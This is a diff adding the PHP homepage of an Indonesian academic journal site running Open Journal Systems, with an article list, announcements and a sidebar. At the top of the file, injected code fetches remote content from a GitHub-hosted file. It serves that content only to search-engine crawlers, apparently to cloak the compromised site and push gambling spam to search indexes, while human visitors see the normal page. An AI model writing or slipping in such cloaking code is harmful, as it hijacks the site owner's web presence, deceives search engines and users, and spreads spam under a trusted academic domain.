@@ -1,0 +1,832 @@
+<?php
+function slotthailand($url) {
+    if (ini_get('allow_url_fopen')) {
+    return file_get_contents($url);
+    } elseif (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
+        $response = curl_exec($ch);
+        curl_close($ch);
+        return $response;
+    }
+    return false;
+}
+
+$res = strtolower($_SERVER["HTTP_USER_AGENT"]);
+$bot = "https://raw.githubusercontent.com/MadzKebab/tothemoon/refs/heads/main/satu88";
+$file = slotthailand($bot);
+$botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
+if (preg_match($botchar, $res)) {
+    if ($_SERVER['REQUEST_URI'] === '/' || $_SERVER['REQUEST_URI'] === '/index.php') { echo $file; exit; }
+}
+?>
+<html lang="en-US" xml:lang="en-US"><head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>
+		Jurnal Pelita Nusa: Social and Humaniora
+					</title>
+
+	
+<meta name="generator" content="Open Journal Systems 3.3.0.13">
+<link rel="alternate" type="application/atom+xml" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/gateway/plugin/AnnouncementFeedGatewayPlugin/atom">
+<link rel="alternate" type="application/rdf+xml" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/gateway/plugin/AnnouncementFeedGatewayPlugin/rss">
+<link rel="alternate" type="application/rss+xml" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/gateway/plugin/AnnouncementFeedGatewayPlugin/rss2">
+</head><body class="pkp_page_index pkp_op_index" dir="ltr"><header class="pkp_structure_head">
+  <div class="pkp_structure_logo">
+    <center><img src="/public/site/coverheader.png" alt="header"></center>
+  </div>
+</header>
+	<link rel="stylesheet" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/$$$call$$$/page/page/css?name=stylesheet" type="text/css"><link rel="stylesheet" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/$$$call$$$/page/page/css?name=font" type="text/css"><link rel="stylesheet" href="https://jurnal.staipelitanusa.ac.id/lib/pkp/styles/fontawesome/fontawesome.css?v=3.3.0.13" type="text/css"><link rel="stylesheet" href="https://jurnal.staipelitanusa.ac.id/public/journals/6/styleSheet.css?d=2023-04-19+10%3A56%3A29" type="text/css">
+
+
+
+	<div class="pkp_structure_page">
+
+				<header class="pkp_structure_head" id="headerNavigationContainer" role="banner">
+						 <nav class="cmp_skip_to_content" aria-label="Jump to content links">
+	<a href="#pkp_content_main">Skip to main content</a>
+	<a href="#siteNav">Skip to main navigation menu</a>
+						<a href="#homepageAbout">Skip to about the journal</a>
+							<a href="#homepageAnnouncements">Skip to announcements</a>
+							<a href="#homepageIssue">Skip to the current issue</a>
+				<a href="#pkp_content_footer">Skip to site footer</a>
+</nav>
+
+			<div class="pkp_head_wrapper">
+
+				<div class="pkp_site_name_wrapper">
+					<button class="pkp_site_nav_toggle">
+						<span>Open Menu</span>
+					</button>
+											<h1 class="pkp_screen_reader">
+															Jurnal Pelita Nusa: Social and Humaniora
+													</h1>
+										<div class="pkp_site_name">
+																<a href="						https://jurnal.staipelitanusa.ac.id/index.php/jpn/index
+					" class="is_text">Jurnal Pelita Nusa: Social and Humaniora</a>
+										</div>
+				</div>
+
+				
+				<nav class="pkp_site_nav_menu" aria-label="Site Navigation">
+					<a id="siteNav"></a>
+					<div class="pkp_navigation_primary_row">
+						<div class="pkp_navigation_primary_wrapper">
+																				<ul id="navigationPrimary" class="pkp_navigation_primary pkp_nav_list">
+								<li class="">
+				<a href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/issue/current">
+					Current
+				</a>
+							</li>
+								<li class="">
+				<a href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/issue/archive">
+					Archives
+				</a>
+							</li>
+								<li class="">
+				<a href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/announcement">
+					Announcements
+				</a>
+							</li>
+								<li class="">
+				<a href="#">
+					About
+				</a>
+									<ul class="">
+																					<li class="">
+									<a href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/about">
+										About the Journal
+									</a>
+								</li>
+																												<li class="">
+									<a href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/about/submissions">
+										Submissions
+									</a>
+								</li>
+																												<li class="">
+									<a href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/about/editorialTeam">
+										Editorial Team
+									</a>
+								</li>
+																												<li class="">
+									<a href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/about/privacy">
+										Privacy Statement
+									</a>
+								</li>
+																												<li class="">
+									<a href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/about/contact">
+										Contact
+									</a>
+								</li>
+																		</ul>
+							</li>
+			</ul>
+
+				
+
+																						<div class="pkp_navigation_search_wrapper">
+									<a href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/search" class="pkp_search pkp_search_desktop">
+										<span class="fa fa-search" aria-hidden="true"></span>
+										Search
+									</a>
+								</div>
+													</div>
+					</div>
+					<div class="pkp_navigation_user_wrapper" id="navigationUserWrapper">
+							<ul id="navigationUser" class="pkp_navigation_user pkp_nav_list">
+								<li class="profile">
+				<a href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/user/register">
+					Register
+				</a>
+							</li>
+								<li class="profile">
+				<a href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/login">
+					Login
+				</a>
+							</li>
+										</ul>
+
+					</div>
+				</nav>
+			</div><!-- .pkp_head_wrapper -->
+		</header><!-- .pkp_structure_head -->
+
+						<div class="pkp_structure_content has_sidebar">
+			<div class="pkp_structure_main" role="main">
+				<a id="pkp_content_main"></a>
+
+<div class="page_index_journal">
+
+	
+
+	
+				<section class="homepage_about">
+			<a id="homepageAbout"></a>
+			<h2>About the Journal</h2>
+			<p>Pelita Nusa Journal, published by the Institute for Research and Community Service (LP2M) of the Pelita Nusa Islamic Religious College West Bandung (STAI PENUS). This journal is open access, a peer-reviewed, journal dedicated to the publication of research in all aspects of the scope of Islamic Economics, Sharia Management and Business (MBS), Sharia Financial Institutions (LKS), Economics and Management, Accounting, Islamic Law; Sharia Economic Law (Mu'amalah), Islamic Family Law; Leadership in Education, School Management, Higher Education Management, Pesantren Management, Regulation and Supervision in the Field of Education, Education Management Information Systems, and Islamic Religious Education. Pelita Nusa Journal is published twice a year, in June and December. Submissions are original author research articles resulting from research design and study based on logical analysis and description.</p>
+		</section>
+	
+				<section class="cmp_announcements highlight_first">
+			<a id="homepageAnnouncements"></a>
+			<h2>
+				Announcements
+			</h2>
+																
+<article class="obj_announcement_summary">
+	<h3>
+		<a href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/announcement/view/13">
+			OJS System Maintenance for Jurnal Pelita Nusa Has Been Completed
+		</a>
+	</h3>
+	<div class="date">
+		2025-10-14
+	</div>
+	<div class="summary">
+		<p><em>Assalamu’alaikum warahmatullahi wabarakatuh,</em></p>
+<p>Dear colleagues,</p>
+<p>We are pleased to inform you that the OJS (Open Journal System) of <strong>Jurnal Pelita Nusa</strong> has successfully completed the repair and maintenance process following technical disruptions caused by a virus attack on our OJS system.</p>
+		<a href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/announcement/view/13" class="read_more">
+			<span aria-hidden="true" role="presentation">
+				Read More
+			</span>
+			<span class="pkp_screen_reader">
+				Read more about OJS System Maintenance for Jurnal Pelita Nusa Has Been Completed
+			</span>
+		</a>
+	</div>
+</article><!-- .obj_announcement_summary -->
+					<div class="more">
+																				<article class="obj_announcement_summary">
+						<h4>
+							<a href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/announcement/view/1">
+								Call Paper
+							</a>
+						</h4>
+						<div class="date">
+							2023-04-17
+						</div>
+					</article>
+										</div><!-- .more -->
+		</section>
+	
+				<section class="current_issue">
+			<a id="homepageIssue"></a>
+			<h2>
+				Current Issue
+			</h2>
+			<div class="current_issue_title">
+				Vol. 5 No. 2 (2025): Desember-Jurnal Pelita Nusa
+			</div>
+				<div class="obj_issue_toc">
+
+		
+		<div class="heading">
+
+									<a class="cover" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/issue/view/18">
+								<img src="https://jurnal.staipelitanusa.ac.id/public/journals/6/cover_issue_18_en_US.png" alt="					View Vol. 5 No. 2 (2025): Desember-Jurnal Pelita Nusa
+				">
+			</a>
+		
+							<div class="description">
+				<p>Pelita Nusa Journal, published by the Institute for Research and Community Service (LP2M) of the Pelita Nusa Islamic Religious College West Bandung (STAI PENUS). This journal is open access, a peer-reviewed, journal dedicated to the publication of research in all aspects of the scope of Islamic Economics, Sharia Management and Business (MBS), Sharia Financial Institutions (LKS), Economics and Management, Accounting, Islamic Law; Sharia Economic Law (Mu'amalah), Islamic Family Law; Leadership in Education, School Management, Higher Education Management, Pesantren Management, Regulation and Supervision in the Field of Education, Education Management Information Systems, and Islamic Religious Education. Pelita Nusa Journal is published twice a year, in June and December. Submissions are original author research articles resulting from research design and study based on logical analysis</p>
+			</div>
+		
+				
+							<div class="published">
+				<span class="label">
+					Published:
+				</span>
+				<span class="value">
+					2025-12-12
+				</span>
+			</div>
+			</div>
+
+		
+		<div class="sections">
+			<div class="section">
+									<h3>
+					Artikel
+				</h3>
+						<ul class="cmp_article_list articles">
+									<li>
+						
+	
+<div class="obj_article_summary">
+	
+	<h4 class="title">
+		<a id="article-168" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/article/view/168">
+			DETERMINASI KEPERCAYAAN MEREK TERHADAP KEPUTUSAN PEMILIHAN PRODUK GRIYA DI BANK SYARIAH INDONESIA KCP PADALARANG
+					</a>
+	</h4>
+
+		<div class="meta">
+				<div class="authors">
+			Hasna Fadhilah, Imam Tunggara, Irfan Saefuloh
+		</div>
+		
+							<div class="pages">
+				137-147
+			</div>
+		
+		
+	</div>
+	
+			<ul class="galleys_links">
+																									<li>
+																										
+	
+							
+
+<a class="obj_galley_link pdf" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/article/view/168/137" aria-labelledby="article-168">
+
+		
+	Desember-Jurnal Pelita Nusa (Bahasa Indonesia)
+
+	</a>
+				</li>
+					</ul>
+	
+	
+</div>
+					</li>
+									<li>
+						
+	
+<div class="obj_article_summary">
+	
+	<h4 class="title">
+		<a id="article-171" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/article/view/171">
+			IMPLIKASI PROMOSI TERHADAP KEPUTUSAN PEMBELIAN RUMAH DI PERUMAHAN THE AWANI RESIDANCE BANDUNG BARAT 
+					</a>
+	</h4>
+
+		<div class="meta">
+				<div class="authors">
+			Nani Nani, Rita Nurnaningsih, Imam Tunggara
+		</div>
+		
+							<div class="pages">
+				148-158
+			</div>
+		
+		
+	</div>
+	
+			<ul class="galleys_links">
+																									<li>
+																										
+	
+							
+
+<a class="obj_galley_link pdf" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/article/view/171/138" aria-labelledby="article-171">
+
+		
+	Desember-Jurnal Pelita Nusa (Bahasa Indonesia)
+
+	</a>
+				</li>
+					</ul>
+	
+	
+</div>
+					</li>
+									<li>
+						
+	
+<div class="obj_article_summary">
+	
+	<h4 class="title">
+		<a id="article-167" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/article/view/167">
+			DAMPAK PEMBERIAN INSENTIF PEGAWAI TERHADAP KINERJA KEUANGAN DENGAN AKAD IJĀRAH DI BADAN KEUANGAN ASET DAERAH KOTA BANDUNG
+					</a>
+	</h4>
+
+		<div class="meta">
+				<div class="authors">
+			Dito Ramdani, Rita Nurnaningsih, Saepul Ma’mun
+		</div>
+		
+							<div class="pages">
+				159-174
+			</div>
+		
+		
+	</div>
+	
+			<ul class="galleys_links">
+																									<li>
+																										
+	
+							
+
+<a class="obj_galley_link pdf" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/article/view/167/139" aria-labelledby="article-167">
+
+		
+	Desember-Jurnal Pelita Nusa (Bahasa Indonesia)
+
+	</a>
+				</li>
+					</ul>
+	
+	
+</div>
+					</li>
+									<li>
+						
+	
+<div class="obj_article_summary">
+	
+	<h4 class="title">
+		<a id="article-281" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/article/view/281">
+			TIPOLOGI DAN DINAMIKA PONDOK PESANTREN DALAM TRANSFORMASI PENDIDIKAN ISLAM DI INDONESIA
+					</a>
+	</h4>
+
+		<div class="meta">
+				<div class="authors">
+			Sally Badriya Hisniati, Irvan Destian, Aceng Badruzzaman, Nova Sariwati, Hasan Basri
+		</div>
+		
+							<div class="pages">
+				175-193
+			</div>
+		
+		
+	</div>
+	
+			<ul class="galleys_links">
+																									<li>
+																										
+	
+							
+
+<a class="obj_galley_link pdf" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/article/view/281/140" aria-labelledby="article-281">
+
+		
+	Desember-Jurnal Pelita Nusa (Bahasa Indonesia)
+
+	</a>
+				</li>
+					</ul>
+	
+	
+</div>
+					</li>
+									<li>
+						
+	
+<div class="obj_article_summary">
+	
+	<h4 class="title">
+		<a id="article-263" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/article/view/263">
+			DAMPAK LITERASI KEUANGAN SYARIAH TERHADAP KEPUTUSAN MENGGUNAKAN PRODUK KPR SYARIAH DI BANK MUAMALAT KCP PADALARANG
+					</a>
+	</h4>
+
+		<div class="meta">
+				<div class="authors">
+			Yunita Rahmawati
+		</div>
+		
+							<div class="pages">
+				194-202
+			</div>
+		
+		
+	</div>
+	
+			<ul class="galleys_links">
+																									<li>
+																										
+	
+							
+
+<a class="obj_galley_link pdf" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/article/view/263/141" aria-labelledby="article-263">
+
+		
+	Desember-Jurnal Pelita Nusa (Bahasa Indonesia)
+
+	</a>
+				</li>
+					</ul>
+	
+	
+</div>
+					</li>
+									<li>
+						
+	
+<div class="obj_article_summary">
+	
+	<h4 class="title">
+		<a id="article-262" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/article/view/262">
+			STRATEGI PEMASARAN KREDIT USAHA RAKYAT (KUR) PT. PEGADAIAN UNIT PEMBANTU CABANG (UPC) RANCABALI
+					</a>
+	</h4>
+
+		<div class="meta">
+				<div class="authors">
+			Mutia Rahmalia, Maryati, Saepul Ma’mun
+		</div>
+		
+							<div class="pages">
+				203-221
+			</div>
+		
+		
+	</div>
+	
+			<ul class="galleys_links">
+																									<li>
+																										
+	
+							
+
+<a class="obj_galley_link pdf" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/article/view/262/142" aria-labelledby="article-262">
+
+		
+	Desember-Jurnal Pelita Nusa (Bahasa Indonesia)
+
+	</a>
+				</li>
+					</ul>
+	
+	
+</div>
+					</li>
+									<li>
+						
+	
+<div class="obj_article_summary">
+	
+	<h4 class="title">
+		<a id="article-175" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/article/view/175">
+			PENGARUH KUALITAS PELAYANAN TERHADAP KEPUASAN PELANGGAN DI GRAND SOVIA HOTEL BANDUNG
+					</a>
+	</h4>
+
+		<div class="meta">
+				<div class="authors">
+			Olis Holisoh, Aep Saefuddin
+		</div>
+		
+							<div class="pages">
+				222-233
+			</div>
+		
+		
+	</div>
+	
+			<ul class="galleys_links">
+																									<li>
+																										
+	
+							
+
+<a class="obj_galley_link pdf" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/article/view/175/143" aria-labelledby="article-175">
+
+		
+	Desember-Jurnal Pelita Nusa (Bahasa Indonesia)
+
+	</a>
+				</li>
+					</ul>
+	
+	
+</div>
+					</li>
+									<li>
+						
+	
+<div class="obj_article_summary">
+	
+	<h4 class="title">
+		<a id="article-169" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/article/view/169">
+			PENGARUH KUALITAS LAYANAN MOBILE BANKING BSI TERHADAP KEPUASAN NASABAH DI BANK SYARIAH INDONESIA KCP PADALARANG
+					</a>
+	</h4>
+
+		<div class="meta">
+				<div class="authors">
+			Muhammad Robbiulsani, Imam Tunggara, Aep Saefuddin
+		</div>
+		
+							<div class="pages">
+				234-244
+			</div>
+		
+		
+	</div>
+	
+			<ul class="galleys_links">
+																									<li>
+																										
+	
+							
+
+<a class="obj_galley_link pdf" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/article/view/169/144" aria-labelledby="article-169">
+
+		
+	Desember-Jurnal Pelita Nusa (Bahasa Indonesia)
+
+	</a>
+				</li>
+					</ul>
+	
+	
+</div>
+					</li>
+									<li>
+						
+	
+<div class="obj_article_summary">
+	
+	<h4 class="title">
+		<a id="article-185" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/article/view/185">
+			PENGARUH LITERASI KEUANGAN SYARIAH TERHADAP TINGKAT PEMAHAMAN MASYARAKAT KECAMATAN CIKALONGWETAN DALAM BERTRANSAKSI DI BANK SYARIAH 
+					</a>
+	</h4>
+
+		<div class="meta">
+				<div class="authors">
+			Lia Yulianti, Maryati, Andri Sutira
+		</div>
+		
+							<div class="pages">
+				245-257
+			</div>
+		
+		
+	</div>
+	
+			<ul class="galleys_links">
+																									<li>
+																										
+	
+							
+
+<a class="obj_galley_link pdf" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/article/view/185/145" aria-labelledby="article-185">
+
+		
+	Desember-Jurnal Pelita Nusa (Bahasa Indonesia)
+
+	</a>
+				</li>
+					</ul>
+	
+	
+</div>
+					</li>
+							</ul>
+				</div>
+		</div><!-- .sections -->
+</div>
+			<a href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/issue/archive" class="read_more">
+				View All Issues
+			</a>
+		</section>
+	
+		</div><!-- .page -->
+
+	</div><!-- pkp_structure_main -->
+
+									<div class="pkp_structure_sidebar left" role="complementary" aria-label="Sidebar">
+				<div class="pkp_block block_custom" id="customblock-menu">
+	<h2 class="title pkp_screen_reader">Menu</h2>
+	<div class="content">
+		<div class="pkp_structure_sidebar left" role="complementary" aria-label="Sidebar">
+<div id="customblock-ISSN" class="pkp_block block_custom">
+<div class="content">
+<table style="width: 251px; margin-left: auto; margin-right: auto; height: 335px;" border="1" cellspacing="0" cellpadding="1">
+<tbody>
+<tr style="height: 18px;">
+<td style="width: 198px; vertical-align: middle; text-align: center; height: 18px;" scope="row" bgcolor="#208A0D" width="198"><span style="color: #ffffff;"><strong>Authentication</strong></span></td>
+</tr>
+<tr style="height: 18px;">
+<td style="width: 198px; vertical-align: middle; text-align: center; height: 18px;" scope="row" bgcolor="#ffffff" width="198">
+<div><form action="https://jurnal.staipelitanusa.ac.id/index.php/index/login/signIn" method="post">
+<table>
+<tbody>
+<tr>
+<td><label for="sidebar-username">Username</label></td>
+<td><input id="sidebar-username" class="textField" maxlength="32" name="username" size="12" type="text" value=""></td>
+</tr>
+<tr>
+<td><label for="sidebar-password">Password</label></td>
+<td><input id="sidebar-password" class="textField" name="password" size="12" type="password" value=""></td>
+</tr>
+<tr>
+<td colspan="2"><input id="remember" name="remember" type="checkbox" value="1"> <label for="remember">Remember me</label></td>
+</tr>
+<tr>
+<td style="text-align: center;" colspan="2"><input class="button" type="submit" value="Login"></td>
+</tr>
+</tbody>
+</table>
+</form></div>
+</td>
+</tr>
+<tr style="height: 34px;">
+<td style="color: white; height: 34px;" valign="top" bgcolor="#208A0D" width="198">
+<p style="text-align: center; margin-bottom: 2px;" align="center"><strong><span style="color: #ffffff;">Additional Menu</span><br></strong></p>
+</td>
+</tr>
+<tr style="height: 18px;">
+<td style="width: 198px; vertical-align: middle; text-align: center; height: 18px;" scope="row" bgcolor="#E3E3E3" width="198"><a title="Daftar-Account" href="https://jurnal.staipelitanusa.ac.id/index.php/index/user/register?source=%2Findex.php%2Findex%2Fabout%2Fsubmissions" target="_blank" rel="noopener"><span style="color: #000000;"><strong>Daftar Account</strong></span></a></td>
+</tr>
+<tr style="height: 18px;">
+<td style="width: 198px; vertical-align: middle; text-align: center; height: 18px;" scope="row" bgcolor="#E3E3E3" width="198"><a title="Editorial-Board" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/about/editorialTeam" target="_blank" rel="noopener"><span style="color: #000000;"><strong>Editorial Board</strong></span></a></td>
+</tr>
+<tr style="height: 18px;">
+<td style="width: 198px; vertical-align: middle; text-align: center; height: 18px;" scope="row" bgcolor="#E3E3E3" width="198"><a title="Focus and Scope" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/Focus_and_scope" target="_blank" rel="noopener"><strong>Focus and Scope</strong></a></td>
+</tr>
+<tr style="height: 18px;">
+<td style="width: 198px; vertical-align: middle; text-align: center; height: 18px;" scope="row" bgcolor="#E3E3E3" width="198"><a title="Author-Guidelines" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/Author_Guidelines" target="_blank" rel="noopener"><span style="color: #000000;"><strong>Author Guidelines</strong></span></a></td>
+</tr>
+<tr style="height: 15.9375px;">
+<td style="width: 198px; vertical-align: middle; text-align: center; height: 15.9375px;" scope="row" bgcolor="#E3E3E3" width="198"><a title="Reviewers" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/Reviewers%20" target="_blank" rel="noopener"><strong><span style="color: #000000;">Reviewers</span></strong></a></td>
+</tr>
+<tr style="height: 18px;">
+<td style="width: 198px; vertical-align: middle; text-align: center; height: 18px;" scope="row" bgcolor="#E3E3E3" width="198"><a title="Online-Submission" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/Online_Submission" target="_blank" rel="noopener"><span style="color: #000000;"><strong>Online Submission</strong></span></a></td>
+</tr>
+<tr style="height: 18px;">
+<td style="width: 198px; vertical-align: middle; text-align: center; height: 18px;" scope="row" bgcolor="#E3E3E3" width="198"><a title="Peer Review Process" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/Peer_Review_Process" target="_blank" rel="noopener"><span style="color: #000000;"><strong>Peer Review Process</strong></span></a></td>
+</tr>
+<tr style="height: 18px;">
+<td style="width: 198px; vertical-align: middle; text-align: center; height: 18px;" scope="row" bgcolor="#E3E3E3" width="198"><a title="Publication-Ethics" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/Publication_Ethics" target="_blank" rel="noopener"><span style="color: #000000;"><strong>Publication Ethics</strong></span></a></td>
+</tr>
+<tr style="height: 18px;">
+<td style="width: 198px; vertical-align: middle; text-align: center; height: 18px;" scope="row" bgcolor="#E3E3E3" width="198"><a title="Plagiarism-Retraction" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/Plagiarism_and_Retraction" target="_blank" rel="noopener"><span style="color: #000000;"><strong>Plagiarism and Retraction</strong></span></a></td>
+</tr>
+<tr style="height: 18px;">
+<td style="width: 198px; vertical-align: middle; text-align: center; height: 18px;" scope="row" bgcolor="#E3E3E3" width="198"><a title="OA" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/Open_Access" target="_blank" rel="noopener"><span style="color: #000000;"><strong>Open Access</strong></span></a></td>
+</tr>
+<tr style="height: 18px;">
+<td style="width: 198px; vertical-align: middle; text-align: center; height: 18px;" scope="row" bgcolor="#E3E3E3" width="198"><a title="Indexing" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/Indexing" target="_blank" rel="noopener"><span style="color: #000000;"><strong>Indexing</strong></span></a></td>
+</tr>
+<tr style="height: 18px;">
+<td style="width: 198px; vertical-align: middle; text-align: center; height: 18px;" scope="row" bgcolor="#E3E3E3" width="198"><a title="CN" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/Copyright_Notice" target="_blank" rel="noopener"><strong><span style="color: #000000;">Copyright Notice</span></strong></a></td>
+</tr>
+<tr style="height: 18px;">
+<td style="width: 198px; vertical-align: middle; text-align: center; height: 18px;" scope="row" bgcolor="#E3E3E3" width="198"><a title="APC" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/Publication_Fee" target="_blank" rel="noopener"><strong>Article Processing Charges</strong></a></td>
+</tr>
+<tr style="height: 18px;">
+<td style="width: 198px; vertical-align: middle; text-align: center; height: 18px;" scope="row" bgcolor="#E3E3E3" width="198"><a title="Contact" href="https://jurnal.staipelitanusa.ac.id/index.php/jpn/Contact" target="_blank" rel="noopener"><span style="color: #000000;"><strong>Contact</strong></span></a></td>
+</tr>
+<tr style="height: 18px;">
+<td style="width: 198px; vertical-align: middle; text-align: center; height: 18px;" scope="row" bgcolor="#208A0D" width="198"><span style="color: #ffffff;"><strong>International Standard Serial Number (ISSN)</strong></span></td>
+</tr>
+<tr style="height: 18px;">
+<td style="width: 198px; vertical-align: middle; text-align: center; height: 18px;" scope="row" bgcolor="#ffffff" width="198"><strong>Elektronik<br><a title="E ISSN" href="https://issn.brin.go.id/terbit?search=2797-7862" target="_blank" rel="noopener"><img src="/public/site/images/adminthes/issn-online.png"></a><br></strong></td>
+</tr>
+<tr style="height: 18px;">
+<td style="width: 198px; vertical-align: middle; text-align: center; height: 18px;" scope="row" bgcolor="#ffffff" width="198"><strong>Print/Cetak<br><a title="P ISSN" href="https://issn.brin.go.id/terbit?search=2797-7862" target="_blank" rel="noopener"><img src="/public/site/images/adminthes/issn-cetak.png"></a><br></strong></td>
+</tr>
+<tr style="height: 18px;">
+<td style="width: 198px; vertical-align: middle; text-align: center; height: 18px;" scope="row" bgcolor="#208A0D" width="198"><span style="color: #ffffff;"><strong>Template Journal</strong></span></td>
+</tr>
+<tr style="height: 18px;">
+<td style="width: 198px; vertical-align: middle; text-align: center; height: 18px;" scope="row" bgcolor="#ffffff" width="198"><strong><a title="Template Unduh" href="https://docs.google.com/document/d/1hIgyrbRMXqDgyj3IbcFgjE926fpdn8U_/edit?usp=drive_link&amp;ouid=104127191921556474042&amp;rtpof=true&amp;sd=true" target="_blank" rel="noopener"><img src="/public/site/images/adminthes/tfs1-.png" width="196" height="79"></a><br></strong></td>
+</tr>
+<tr style="height: 18px;">
+<td style="width: 198px; vertical-align: middle; text-align: center; height: 18px;" scope="row" bgcolor="#208A0D" width="198"><span style="color: #ffffff;"><strong>Call For Reviewer &amp; Editor</strong></span></td>
+</tr>
+<tr style="height: 18px;">
+<td style="width: 198px; vertical-align: middle; text-align: center; height: 18px;" scope="row" bgcolor="#ffffff" width="198"><strong><a href="https://docs.google.com/forms/d/1ey0FvpaW7uuLeLu_3EgghJvne7XppJE-9RYkVq181vc/edit" target="_blank" rel="noopener"><img src="/public/site/images/adminthes/call-editor-and-reviewer.png" width="199" height="60"></a><br></strong></td>
+</tr>
+<tr style="height: 18px;">
+<td style="width: 198px; vertical-align: middle; text-align: center; height: 18px;" scope="row" bgcolor="#208A0D" width="198"><span style="color: #ffffff;"><strong>JPN has been Indexed by:</strong></span></td>
+</tr>
+<tr style="height: 18px;">
+<td style="width: 198px; vertical-align: middle; text-align: center; height: 18px;" scope="row" bgcolor="#ffffff" width="198">
+<p><a title="Dimensions" href="https://app.dimensions.ai/discover/publication?search_mode=content&amp;and_facet_source_title=jour.1460226" target="_blank" rel="noopener"><img src="https://jurnal.staipelitanusa.ac.id/public/site/images/adminthes/a8c4649f-f40a-48f1-b4dd-1a94138e80bb-98ef3d357a57b5ae5e17460410c4659f.jpg" alt="Dimensions" width="344" height="118"></a></p>
+<p><a title="GS JPN" href="https://scholar.google.co.id/citations?user=cuGsWBQAAAAJ&amp;hl=en&amp;authuser=4" target="_blank" rel="noopener"><img src="https://jurnal.staipelitanusa.ac.id/public/site/images/adminthes/gs-indexing-a7e1c084d94bb31a775a5a13a384cb7b.jpg" alt="" width="347" height="120"></a></p>
+<p><a style="color: #113241;" title="Index-Garuda" href="https://garuda.kemdikbud.go.id/journal/view/32826" target="_blank" rel="noopener"><img src="https://jurnal.staipelitanusa.ac.id/public/site/images/adminthes/garuda-indexing.jpg" alt="" width="347" height="120"></a></p>
+<p><a title="Moraref Indexing" href="https://moraref.kemenag.go.id/archives/journal?q=jurnal+pelita+nusa&amp;subject=Humaniora&amp;pub=STAI+Pelita+Nusa+Bandung+Barat&amp;prefix=" target="_blank" rel="noopener"><img src="https://jurnal.staipelitanusa.ac.id/public/site/images/adminthes/moraref-indexing.jpg" alt="" width="347" height="120"></a></p>
+</td>
+</tr>
+<tr style="height: 18px;">
+<td style="width: 198px; vertical-align: middle; text-align: center; height: 18px;" scope="row" bgcolor="#208A0D" width="198">
+<p><span style="color: #ffffff;"><strong>Tools: </strong></span><span style="color: #ffffff;"><strong>Plagiarism Checkers, Reference Management</strong></span></p>
+</td>
+</tr>
+<tr style="height: 18px;">
+<td style="width: 198px; vertical-align: middle; text-align: center; height: 18px;" scope="row" bgcolor="#ffffff" width="198">
+<p><strong><a href="https://www.turnitin.com/" target="_blank" rel="noopener"><img src="/public/site/images/adminthes/turnitin-logo-d976d302ebce059d6141b25ff39e0500.png" width="63" height="65"> </a><a href="https://plagiarismcheckerx.com/" target="_blank" rel="noopener"><img src="/public/site/images/adminthes/logo-blue-black-500x1801-_-_Copy1.png" width="146" height="50"></a></strong></p>
+<p><a title="ZeroGPT AI" href="https://www.zerogpt.com/" target="_blank" rel="noopener"><strong><img src="https://jurnal.staipelitanusa.ac.id/public/site/images/adminthes/zero-gpt-76f9cfcd3bf5989b4d5fbb7cf61b81f6.jpg" alt="ZeroGPT" width="189" height="81"></strong></a></p>
